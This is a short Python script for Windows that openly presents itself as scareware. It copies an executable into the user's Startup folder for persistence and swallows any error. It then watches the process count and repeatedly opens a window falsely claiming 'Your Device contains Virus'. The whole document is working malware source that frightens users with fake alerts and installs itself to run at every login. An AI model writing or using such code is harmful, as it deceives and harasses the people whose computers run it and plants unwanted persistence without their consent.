import psutil as psu
from tkinter import *
import subprocess as sb
import shutil
import os


#To startup
try:
    path = os.path.expanduser('~')
    src = os.path.join(path,'Desktop\\Bin\\Scareware\\scareware.exe')
    dst = os.path.join(path,'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup')
    shutil.copy(src,dst)

except:
    pass



def show():
    window = Tk()
    window.title("Virus Threat")
    window.geometry("700x450")
    window.configure(bg="orange red")

    # center this label
    lbl1 = Label(window, text="Your Device contains Virus", bg="blue", fg="white", font="none 24 bold")
    lbl1.config(anchor=CENTER)
    lbl1.pack()

    window.mainloop()



#First time
base = len(psu.pids())
show()
cnt=0
while True:
    prev = cnt
    cnt = len(psu.pids())

    if cnt<prev:
        base = cnt - 2
        prev = cnt - 1

    if cnt - base >= 3:
        base = cnt
        show()

